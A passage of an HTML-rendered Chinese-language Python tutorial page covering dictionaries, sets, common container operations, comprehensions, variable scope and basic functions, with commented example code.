class=\"line\">dict1[&#x27;id&#x27;] = 110</span><br><span class=\"line\">print(dict1)</span><br><span class=\"line\"></span><br><span class=\"line\">dict1[&#x27;name&#x27;] = &#x27;Rose&#x27;</span><br><span class=\"line\">print(dict1) # 字典是可变类型</span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;--------------------字典的删除----------------------&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"># del 删除字典或指定的键值对</span><br><span class=\"line\"># del(dict1)</span><br><span class=\"line\"># print(dict1)</span><br><span class=\"line\"></span><br><span class=\"line\">del dict1[&#x27;name&#x27;]</span><br><span class=\"line\">print(dict1)</span><br><span class=\"line\"></span><br><span class=\"line\"># clear() 清空字典</span><br><span class=\"line\">dict1.clear()</span><br><span class=\"line\">print(dict1)</span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;--------------------字典的查找----------------------&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">dict2 = &#123;&#x27;name&#x27;: &#x27;TOM&#x27;, &#x27;age&#x27;: 20, &#x27;gender&#x27;: &#x27;male&#x27;&#125;</span><br><span class=\"line\"># 1. Key值查找</span><br><span class=\"line\">print(dict2[&#x27;name&#x27;]) # 返回对应的值（Key存在）</span><br><span class=\"line\"># print(dict1[&#x27;names&#x27;]) # key不存在，报错</span><br><span class=\"line\"></span><br><span class=\"line\"># 2. 函数</span><br><span class=\"line\"># 2.1 get()</span><br><span class=\"line\">print(dict2.get(&#x27;name&#x27;))</span><br><span class=\"line\">print(dict2.get(&#x27;names&#x27;)) # 如果key不存在，返回None</span><br><span class=\"line\">print(dict2.get(&#x27;names&#x27;, &#x27;Lily&#x27;))</span><br><span class=\"line\"></span><br><span class=\"line\"># 2.2 keys() -- 查找字典中所有的key，返回可迭代对象</span><br><span class=\"line\">print(dict2.keys())</span><br><span class=\"line\"></span><br><span class=\"line\"># 2.3 values() -- 查找字典中所有值，返回可迭代对象</span><br><span class=\"line\">print(dict2.values())</span><br><span class=\"line\"></span><br><span class=\"line\"># 2.4 items() -- 查找字典中所有的键值对，返回可迭代对象，里面的数据是元组，</span><br><span class=\"line\"># 元组数据1是字典的key，元组数据2是字典key所对应的值</span><br><span class=\"line\">print(dict2.items())</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"字典的循环遍历\"><a href=\"#字典的循环遍历\" class=\"headerlink\" title=\"字典的循环遍历\"></a>字典的循环遍历</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">dict1 = &#123;&#x27;name&#x27;: &#x27;TOM&#x27;, &#x27;age&#x27;: 20, &#x27;gender&#x27;: &#x27;male&#x27;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"># 1. 遍历字典的key</span><br><span class=\"line\">for key in dict1.keys():</span><br><span class=\"line\">    print(key)</span><br><span class=\"line\"></span><br><span class=\"line\"># 2. 遍历字典的value</span><br><span class=\"line\">for value in dict1.values():</span><br><span class=\"line\">    print(value)</span><br><span class=\"line\"></span><br><span class=\"line\"># 3. 遍历字典的元素</span><br><span class=\"line\">for item in dict1.items():</span><br><span class=\"line\">    print(item)</span><br><span class=\"line\"></span><br><span class=\"line\"># 4. 遍历字典的键值对（拆包）</span><br><span class=\"line\"># items() -- 查找字典中所有的键值对，返回可迭代对象，里面的数据是元组，</span><br><span class=\"line\"># 元组数据1是字典的key，元组数据2是字典key所对应的值</span><br><span class=\"line\">for key, value in dict1.items():</span><br><span class=\"line\">    print(key)</span><br><span class=\"line\">    print(value)</span><br><span class=\"line\">    print(f&#x27;&#123;key&#125; = &#123;value&#125;&#x27;)</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"创建集合\"><a href=\"#创建集合\" class=\"headerlink\" title=\"创建集合\"></a>创建集合</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 1. 创建有数据的集合</span><br><span class=\"line\">s1 = &#123;10, 20, 30, 40, 50&#125;</span><br><span class=\"line\">print(s1)</span><br><span class=\"line\"></span><br><span class=\"line\">s2 = &#123;10, 30, 20, 40, 30, 20&#125;</span><br><span class=\"line\">print(s2)</span><br><span class=\"line\"></span><br><span class=\"line\">s3 = set(&#x27;abcdefg&#x27;)</span><br><span class=\"line\">print(s3)</span><br><span class=\"line\"></span><br><span class=\"line\"># 2. 创建空集合</span><br><span class=\"line\">s4 = set()</span><br><span class=\"line\">print(s4)</span><br><span class=\"line\">print(type(s4))</span><br><span class=\"line\"></span><br><span class=\"line\">s5 = &#123;&#125; # &#123;&#125;创建空字典</span><br><span class=\"line\">print(type(s5))</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"集合的常见操作\"><a href=\"#集合的常见操作\" class=\"headerlink\" title=\"集合的常见操作\"></a>集合的常见操作</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">print(&#x27;--------------------数据的增加----------------------&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">s1 = &#123;10, 20&#125;</span><br><span class=\"line\"># 1. add() -- 增加</span><br><span class=\"line\">s1.add(100)</span><br><span class=\"line\">print(s1) # 集合是可变类型</span><br><span class=\"line\"># 集合有去重功能，如果增加的数据是集合中已有数据，则无效</span><br><span class=\"line\">s1.add(100)</span><br><span class=\"line\">print(s1)</span><br><span class=\"line\">#s1.add([10, 20, 30]) # 不能增加数据序列，报错</span><br><span class=\"line\"># print(s1)</span><br><span class=\"line\"></span><br><span class=\"line\"># 2. update() -- 增加数据序列</span><br><span class=\"line\">s2 = &#123;10, 20&#125;</span><br><span class=\"line\">s2.update([10, 20, 30, 40, 50])</span><br><span class=\"line\">print(s2)</span><br><span class=\"line\"># s2.update(100) # update不能增加单一数据，报错</span><br><span class=\"line\"># print(s2)</span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;--------------------数据的删除----------------------&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">s3 = &#123;10, 20, 30, 40, 50&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"># （1）remove()：删除指定数据，如果数据不存在则报错</span><br><span class=\"line\"># s3.remove(10)</span><br><span class=\"line\"># print(s3)</span><br><span class=\"line\"></span><br><span class=\"line\"># s3.remove(10) # 报错</span><br><span class=\"line\"># print(s3)</span><br><span class=\"line\"></span><br><span class=\"line\"># （2）discard(): 删除指定数据，如果数据不存在不报错</span><br><span class=\"line\"># s3.discard(10)</span><br><span class=\"line\"># print(s3)</span><br><span class=\"line\"></span><br><span class=\"line\"># s3.discard(10) # 不存在也不报错</span><br><span class=\"line\"># print(s3)</span><br><span class=\"line\"></span><br><span class=\"line\"># （3）pop(): 随机删除某个数据，并返回这个数据</span><br><span class=\"line\">del_num = s3.pop()</span><br><span class=\"line\">print(del_num)</span><br><span class=\"line\">print(s3)</span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;--------------------集合的查找----------------------&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">s4 = &#123;10, 20, 30, 40, 50&#125;</span><br><span class=\"line\"># in 或 not in 判断数据是否存在</span><br><span class=\"line\">print(10 in s4)</span><br><span class=\"line\"></span><br><span class=\"line\">print(10 not in s4)</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"公共操作之运算符\"><a href=\"#公共操作之运算符\" class=\"headerlink\" title=\"公共操作之运算符\"></a>公共操作之运算符</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\">str1 = &#x27;aa&#x27;</span><br><span class=\"line\">str2 = &#x27;bb&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">list1 = [1, 2]</span><br><span class=\"line\">list2 = [10, 20]</span><br><span class=\"line\"></span><br><span class=\"line\">t1 = (1, 2)</span><br><span class=\"line\">t2 = (10, 20)</span><br><span class=\"line\"></span><br><span class=\"line\">dict1 = &#123;&#x27;name&#x27;: &#x27;python&#x27;&#125;</span><br><span class=\"line\">dict2 = &#123;&#x27;age&#x27;: 30&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;-------------------- +: 合并----------------------&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">print(str1 + str2)</span><br><span class=\"line\">print(list1 + list2)</span><br><span class=\"line\">print(t1 + t2)</span><br><span class=\"line\"># print(dict1 + dict2) # 报错：字典不支持合并运算</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;-------------------- *: 复制----------------------&#x27;)</span><br><span class=\"line\"># 不支持字典操作</span><br><span class=\"line\">str1 = &#x27;a&#x27;</span><br><span class=\"line\">list1 = [&#x27;hello&#x27;]</span><br><span class=\"line\">t1 = (&#x27;world&#x27;,)</span><br><span class=\"line\"></span><br><span class=\"line\">print(str1 * 5)</span><br><span class=\"line\"></span><br><span class=\"line\"># 打印10个-：</span><br><span class=\"line\">print(&#x27;-&#x27; * 10)</span><br><span class=\"line\">print(list1 * 5)</span><br><span class=\"line\">print(t1 * 5)</span><br><span class=\"line\"></span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;-------------------- in, not in: 判断数据是否存在------------------&#x27;)</span><br><span class=\"line\"># 支持字典操作</span><br><span class=\"line\">str1 = &#x27;abcd&#x27;</span><br><span class=\"line\">list1 = [10, 20, 30, 40]</span><br><span class=\"line\">t1 = (100, 200, 300, 400)</span><br><span class=\"line\">dict1 = &#123;&#x27;name&#x27;: &#x27;python&#x27;, &#x27;age&#x27;: 30&#125;</span><br><span class=\"line\">print(&#x27;a&#x27; in str1)</span><br><span class=\"line\">print(&#x27;a&#x27; not in str1)</span><br><span class=\"line\"></span><br><span class=\"line\">print(10 in list1)</span><br><span class=\"line\">print(10 not in list1)</span><br><span class=\"line\"></span><br><span class=\"line\">print(100 in t1)</span><br><span class=\"line\">print(100 not in t1)</span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;name&#x27; in dict1)</span><br><span class=\"line\">print(&#x27;name&#x27; not in dict1)</span><br><span class=\"line\">print(&#x27;name&#x27; in dict1.keys())</span><br><span class=\"line\">print(&#x27;name&#x27; in dict1.values())</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"公共方法之len-del-max-min-range-enumerate\"><a href=\"#公共方法之len-del-max-min-range-enumerate\" class=\"headerlink\" title=\"公共方法之len, del,  max-min, range, enumerate\"></a>公共方法之len, del,  max-min, range, enumerate</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">str1 = &#x27;abcdefg&#x27;</span><br><span class=\"line\">list1 = [10, 20, 30, 40 ,50]</span><br><span class=\"line\">t1 = (10, 20, 30, 40, 50)</span><br><span class=\"line\">s1 = &#123;10, 20, 30, 40, 50&#125;</span><br><span class=\"line\">dict1 = &#123;&#x27;name&#x27;: &#x27;TOM&#x27;, &#x27;age&#x27;: 18&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\">print(&#x27;-----------------len: 计算容器中元素的个数--------------&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">print(len(str1))</span><br><span class=\"line\">print(len(list1))</span><br><span class=\"line\">print(len(t1))</span><br><span class=\"line\">print(len(t1))</span><br><span class=\"line\">print(len(dict1))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;-----------------del: 删除--------------&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"># del 目标 或 del(目标)</span><br><span class=\"line\"># del str1</span><br><span class=\"line\"># print(str1)</span><br><span class=\"line\"></span><br><span class=\"line\"># del(list1)</span><br><span class=\"line\"># print(list1)</span><br><span class=\"line\"></span><br><span class=\"line\"># del(list1[0])</span><br><span class=\"line\"># print(list1)</span><br><span class=\"line\"></span><br><span class=\"line\">del dict1[&#x27;name&#x27;]</span><br><span class=\"line\">print(dict1)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;-------------max and min: 返回容器中的最大值和最小值--------------&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">print(max(str1))</span><br><span class=\"line\">print(max(list1))</span><br><span class=\"line\">print(min(s1))</span><br><span class=\"line\">print(min(t1))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;-------------range(start, end, step)--------------&#x27;)</span><br><span class=\"line\"># 生成从start到end的数字，步长为step，供for循环使用</span><br><span class=\"line\"># 不包含end数字，规则与切片类似，默认从0开始，默认步长为1</span><br><span class=\"line\">print(range(1, 10, 1))</span><br><span class=\"line\">for i in range(1, 10, 1):</span><br><span class=\"line\">    print(i)</span><br><span class=\"line\">print(&#x27;-&#x27; * 10)</span><br><span class=\"line\"></span><br><span class=\"line\">for j in range(1, 10):</span><br><span class=\"line\">    print(j)</span><br><span class=\"line\">print(&#x27;-&#x27; * 10)</span><br><span class=\"line\">for h in range(1, 10, 2):</span><br><span class=\"line\">    print(h)</span><br><span class=\"line\">print(&#x27;-&#x27; * 10)</span><br><span class=\"line\">for k in range(10):</span><br><span class=\"line\">    print(k)</span><br><span class=\"line\"></span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;-------------enumerate()--------------&#x27;)</span><br><span class=\"line\"># 函数用于将一个可遍历的数据对象（列表，元组，字符串）组合为一个索引序列，</span><br><span class=\"line\"># 同时列出数据和数据下标，一般用在for循环当中</span><br><span class=\"line\"># 语法： enumerate(可遍历对象， start=0)</span><br><span class=\"line\"># start参数用来设置遍历数据的下标的起始值，默认为0</span><br><span class=\"line\"># 返回数据是元组，元组的第一个数据是原迭代对象的数据对应的下标，</span><br><span class=\"line\"># 第二个则是原迭代对象的数据</span><br><span class=\"line\">for i in enumerate(list1):</span><br><span class=\"line\">    print(i)</span><br><span class=\"line\">print(&#x27;-&#x27; * 10)</span><br><span class=\"line\">for j in enumerate(list1, start=1):</span><br><span class=\"line\">    print(j)</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"容器类型转换\"><a href=\"#容器类型转换\" class=\"headerlink\" title=\"容器类型转换\"></a>容器类型转换</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">list1 = [10, 20, 30, 20, 40, 50]</span><br><span class=\"line\">s1 = &#123;100, 300, 200, 500&#125;</span><br><span class=\"line\">t1 = (&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;, &#x27;d&#x27;, &#x27;e&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"># 1. tuple()：转换成元组</span><br><span class=\"line\">print(type(tuple(list1)))</span><br><span class=\"line\">print(tuple(list1))</span><br><span class=\"line\">print(tuple(s1))</span><br><span class=\"line\"></span><br><span class=\"line\"># 2. list()：转换成列表</span><br><span class=\"line\">print(list(s1))</span><br><span class=\"line\">print(list(t1))</span><br><span class=\"line\"></span><br><span class=\"line\"># 3. set(): 转换成集合（去重，不支持下标）</span><br><span class=\"line\">print(set(list1))</span><br><span class=\"line\">print(set(t1))</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"推导式\"><a href=\"#推导式\" class=\"headerlink\" title=\"推导式\"></a>推导式</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 列表、字典、集合支持推导式</span><br><span class=\"line\"># 作用：用一个表达式创建一个有规律的列表或控制一个有规律的列表（又叫列表生成式，简化代码）</span><br><span class=\"line\"></span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\">print(&#x27;-----------------while循环创建有规律的列表--------------&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"># 创建一个0-10的列表</span><br><span class=\"line\"># 1. 准备一个空列表</span><br><span class=\"line\">list1 = []</span><br><span class=\"line\"># 2. 循环将有规律的数据写入列表</span><br><span class=\"line\">i = 0</span><br><span class=\"line\">while i &lt; 10:</span><br><span class=\"line\">    list1.append(i)</span><br><span class=\"line\">    i += 1</span><br><span class=\"line\">print(list1)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;-----------------for循环创建有规律的列表--------------&#x27;)</span><br><span class=\"line\">list1 = []</span><br><span class=\"line\">for j in range(10):</span><br><span class=\"line\">    list1.append(j)</span><br><span class=\"line\">print(list1)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;-----------------列表推导式创建有规律的列表--------------&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">list1 = [i for i in range(10)]</span><br><span class=\"line\">print(list1)</span><br><span class=\"line\"></span><br><span class=\"line\">print([i for i in range(10)])</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;-----------------带if的列表推导式--------------&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"># 创建0-10的偶数列表</span><br><span class=\"line\"># 1. range()步长实现</span><br><span class=\"line\">list1 = [i for i in range(0, 10, 2)]</span><br><span class=\"line\">print(list1)</span><br><span class=\"line\"></span><br><span class=\"line\"># 2. if实现</span><br><span class=\"line\">list2 = []</span><br><span class=\"line\">for i in range(10):</span><br><span class=\"line\">    if i % 2 == 0:</span><br><span class=\"line\">        list2.append(i)</span><br><span class=\"line\">print(list2)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># 3. 把for循环配合if的代码，改写成带if的列表推导式</span><br><span class=\"line\">list3 = [i for i in range(10) if i % 2 == 0]</span><br><span class=\"line\">print(list3)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;-----------------多个for循环实现列表推导式--------------&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"># 创建列表如下：[(1, 0),(1, 1),(1, 2),(2, 0),(2, 1),(2, 2)]</span><br><span class=\"line\"># 数据1: 1,2 range(1,3)</span><br><span class=\"line\"># 数据2：0，1，2 range(3)</span><br><span class=\"line\">list1 = []</span><br><span class=\"line\">for i in range(1, 3):</span><br><span class=\"line\">    for j in range(3):</span><br><span class=\"line\">        # 列表里面追加元组：循环前准备一个空列表，然后追加元组数据到列表</span><br><span class=\"line\">        list1.append((i, j))</span><br><span class=\"line\">print(list1)</span><br><span class=\"line\"></span><br><span class=\"line\"># 多个for实现列表推导式</span><br><span class=\"line\">list2 = [(i, j) for i in range(1, 3) for j in range(3)]</span><br><span class=\"line\">print(list2)</span><br><span class=\"line\"></span><br><span class=\"line\">print([(i, j) for i in range(1, 3) for j in range(3)])</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;-----------------字典推导式--------------&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"># 字典推导式作用：快速合并列表为字典或提取字典中目标数据</span><br><span class=\"line\"># 1. 创建一个字典：字典key是1-5的数字，value是这个数字的2次方</span><br><span class=\"line\">dict1 = &#123;i: i**2 for i in range(1, 5)&#125;</span><br><span class=\"line\">print(dict1)</span><br><span class=\"line\">print(type(dict1))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># 2. 将两个列表合并为一个字典</span><br><span class=\"line\">list1 = [&#x27;name&#x27;, &#x27;age&#x27;, &#x27;gender&#x27;, &#x27;id&#x27;]</span><br><span class=\"line\">list2 = [&#x27;TOM&#x27;, 20, &#x27;male&#x27;]</span><br><span class=\"line\"></span><br><span class=\"line\">dict1 = &#123;list1[i]: list2[i] for i in range(len(list2))&#125;</span><br><span class=\"line\">print(dict1)</span><br><span class=\"line\"></span><br><span class=\"line\"># (1). 如果两个列表数据个数相同，len统计任何一个列表的长度都可以</span><br><span class=\"line\"># (2). 如果两个列表数据个数不同，len统计数据多的列表会报错，统计数据少的列表则不会报错</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># 3. 提取字典中目标数据</span><br><span class=\"line\">counts = &#123;&#x27;MBP&#x27;: 268, &#x27;HP&#x27;: 125, &#x27;DELL&#x27;: 201, &#x27;Lenovo&#x27;: 199, &#x27;acer&#x27;: 99&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"># 1. 提取上述电脑数量大于等于200的字典数据</span><br><span class=\"line\"># 获取所有键值对数据，判断value大于等于200，返回 字典</span><br><span class=\"line\">count1 = &#123;key: value for key, value in counts.items() if value &gt; 200&#125;</span><br><span class=\"line\">print(count1)</span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;-----------------集合推导式--------------&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"># 创建一个集合，数据为下方列表的2次方</span><br><span class=\"line\">list1 = [1, 1, 2]</span><br><span class=\"line\">set1 = &#123;i ** 2 for i in list1&#125;</span><br><span class=\"line\">print(set1) # &#123;1, 1, 4&#125;去重则为&#123;1, 4&#125;</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"局部变量和全局变量\"><a href=\"#局部变量和全局变量\" class=\"headerlink\" title=\"局部变量和全局变量\"></a>局部变量和全局变量</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 局部变量：定义在函数体内部，只在函数体内部生效</span><br><span class=\"line\"># 作用：在函数体内部，临时保存数据，当函数调用完成后，则销毁局部变量</span><br><span class=\"line\"></span><br><span class=\"line\"># 全局变量：在函数体内，外都能生效的变量</span><br><span class=\"line\"></span><br><span class=\"line\"># 修改全局变量</span><br><span class=\"line\"></span><br><span class=\"line\">a = 100</span><br><span class=\"line\"></span><br><span class=\"line\">print(a)</span><br><span class=\"line\"></span><br><span class=\"line\">def testA():</span><br><span class=\"line\">    print(a)</span><br><span class=\"line\"></span><br><span class=\"line\">def testB():</span><br><span class=\"line\">    a = 200 # 修改的a是局部变量，没有修改到全局变量的a</span><br><span class=\"line\">    print(a)</span><br><span class=\"line\"></span><br><span class=\"line\">def testC():</span><br><span class=\"line\">    # 声明a为全局变量用global</span><br><span class=\"line\">    global a</span><br><span class=\"line\">    a = 200 # 此时修改的是全局变量a</span><br><span class=\"line\">    print(a)</span><br><span class=\"line\"></span><br><span class=\"line\">testA()</span><br><span class=\"line\">testB()</span><br><span class=\"line\">print(a)</span><br><span class=\"line\"></span><br><span class=\"line\">testC()</span><br><span class=\"line\">print(a)</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"函数\"><a href=\"#函数\" class=\"headerlink\" title=\"函数\"></a>函数</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 作用：可以更高效的实现代码重用</span><br><span class=\"line\"></span><br><span class=\"line\"># 步骤：1. 定义函数 def 函数名(参数)：2.调用函数 函数名(参数) -- 参数按需求可写可不写</span><br><span class=\"line\"># 注意：1. 函数先定义后调用，如果先调用会报错；2. 如果不调用函数，函数里面的代码不会执行</span><br><span class=\"line\"># 3. 函数执行流程：当调用函数的时候，解释器回到定义函数的地方去执行下方缩进的代码，当这些代码执行完，</span><br><span class=\"line\"># 回到调用函数的地方继续向下执行</span><br><span class=\"line\"># 定义函数的时候，函数体内部缩进的代码并没有执行</span><br><span class=\"line\"></span><br><span class=\"line\"># 实例：ATM机功能展示</span><br><span class=\"line\"></span><br><span class=\"line\"># 因为函数需要先定义再调用，所以步骤2、3需要在步骤1上面书写</span><br><span class=\"line\"># 2. 确定选择功能界面 # 3. 封装函数</span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\">def sel_func():</span><br><span class=\"line\">    print(&#x27;TouchBalance&#x27;)</span><br><span class=\"line\">    print(&#x27;deposit&#x27;)</span><br><span class=\"line\">    print(&#x27;withdrawal&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"># 1. 搭建整体框架</span><br><span class=\"line\">print(&#x27;login success&#x27;)</span><br><span class=\"line\">sel_func() # 4. 调用函数</span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;Your balance is 100 dollars&#x27;)</span><br><span class=\"line\">sel_func() # 4. 调用函数</span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;You\\&#x27;ve just withdrawn a hundred dollars&#x27;)</span><br><span class=\"line\">sel_func() # 4. 调用函数</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;-----------------函数的参数作用--------------&#x27;)</span><br><span class=\"line\">def add_num(num1, num2): # 定义函数时接收数据，形参</span><br><span class=\"line\">    result = num1 + num2</span><br><span class=\"line\">    print(result)</span><br><span class=\"line\"></span><br><span class=\"line\">num1 = int(input(&#x27;please input number:  &#x27;))</span><br><span class=\"line\"></span><br><span class=\"line\">num2 = int(input(&#x27;please input number:  &#x27;))</span><br><span class=\"line\"></span><br><span class=\"line\">add_num(num1, num2) # 调用函数时传入真实数据，实参</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;-----------------函数的返回值作用--------------&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"># 定义一个函数，返回 烟</span><br><span class=\"line\">def buy():</span><br><span class=\"line\">    return &#x27;smoke&#x27;</span><br><span class=\"line\">    print(&#x27;ok&#x27;)</span><br><span class=\"line\"># 使用变量保存返回值</span><br><span class=\"line\">goods = buy()</span><br><span class=\"line\">print(goods)</span><br><span class=\"line\"></span><br><span class=\"line\"># return的作用：1. 负责函数返回值， 2. 退出当前函数，导致return下方的所有代码（函数体内部）不执行</span><br><span class=\"line\"></span><br><span class=\"line\"># 实例：制作加法计算器</span><br><span class=\"line\"></span><br><span class=\"line\">def add_num(a, b):</span><br><span class=\"line\">    result = a + b</span><br><span class=\"line\">    return result</span><br><span class=\"line\"></span><br><span class=\"line\">sum = add_num(1, 2)</span><br><span class=\"line\">print(sum)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;-----------------函数的说明文档--------------&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"># help(len) # help函数作用：查看函数的说明文档</span><br><span class=\"line\"># 语法：</span><br><span class=\"line\">def 函数名(参数):</span><br><span class=\"line\">    &quot;&quot;&quot;说明文档位置&quot;&quot;&quot;</span><br><span class=\"line\">    代码</span><br><span class=\"line\">    ......</span><br><span class=\"line\"></span><br><span class=\"line\">查看说明文档：help(函数名)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">def sum(a, b):</span><br><span class=\"line\">    &quot;&quot;&quot;The sum function&quot;&quot;&quot;</span><br><span class=\"line\">    return a + b</span><br><span class=\"line\">help(sum)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># 函数说明文档的高级使用--&quot;&quot;&quot;回车&quot;&quot;&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">def sum1(a, b):</span><br><span class=\"line\">    &quot;&quot;&quot;</span><br><span class=\"line\">    The sum function</span><br><span class=\"line\">    :param a: parameter参数1</span><br><span class=\"line\">    :param b: 参数2</span><br><span class=\"line\">    :return: 返回值</span><br><span class=\"line\">    &quot;&quot;&quot;</span><br><span class=\"line\">    return a + b</span><br><span class=\"line\">help(sum1)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;-----------------函数的嵌套调用--------------&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"># 指一个函数里面又调用另一个函数</span><br><span class=\"line\"></span><br><span class=\"line\"># 打印一条横线</span><br><span class=\"line\">def print_line():</span><br><span class=\"line\">    print(&#x27;-&#x27; * 20)</span><br><span class=\"line\"># print_line()</span><br><span class=\"line\"></span><br><span class=\"line\"># 打印多条横线</span><br><span class=\"line\"></span><br><span class=\"line\">def print_lines(num):</span><br><span class=\"line\">    i = 0</span><br><span class=\"line\">    while i &lt; num:</span><br><span class=\"line\">        print_line()</span><br><span class=\"line\">        i += 1</span><br><span class=\"line\">print_lines(5)</span><br><span class=\"line\"></span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\"># 任意三个数之和</span><br><span class=\"line\">def sum_num(a, b, c):</span><br><span class=\"line\">    return a + b + c</span><br><span class=\"line\"></span><br><span class=\"line\">result = sum_num(1, 2, 3)</span><br><span class=\"line\"># print(result)</span><br><span class=\"line\"></span><br><span class=\"line\"># 任意三个数求平均值</span><br><span class=\"line\">def average_num(a, b, c):</span><br><span class=\"line\">    sumresult = sum_num(a, b, c)</span><br><span class=\"line\">    return sumresult / 3</span><br><span class=\"line\"></span><br><span class=\"line\">averageresult = average_num(1, 2, 3)</span><br><span class=\"line\">print(averageresult)</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"函数的常见操作\"><a href=\"#函数的常见操作\" class=\"headerlink\" title=\"函数的常见操作\"></a>函数的常见操作</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\">print(&#x27;-----------------返回值作为参数传递--------------&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">def test1():</span><br><span class=\"line\">    return 50</span><br><span class=\"line\"></span><br><span class=\"line\">def test2(num):</span><br><span class=\"line\">    print(num)</span><br><span class=\"line\"># 把函数一的返回值作为参数传入函数二</span><br><span class=\"line\">result = test1()</span><br><span class=\"line\">test2(result)</span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;-----------------函数的返回值--------------&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"># 1.有多个return的函数的执行流程</span><br><span class=\"line\">def return_num():</span><br><span class=\"line\">    return 1  # 只执行第一个return，这种形式无法做到一个函数多个返回值</span><br><span class=\"line\">    return 2</span><br><span class=\"line\">result = return_num()</span><br><span class=\"line\">print(result)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># 2. 多个返回值的正确写法</span><br><span class=\"line\"></span><br><span class=\"line\">def 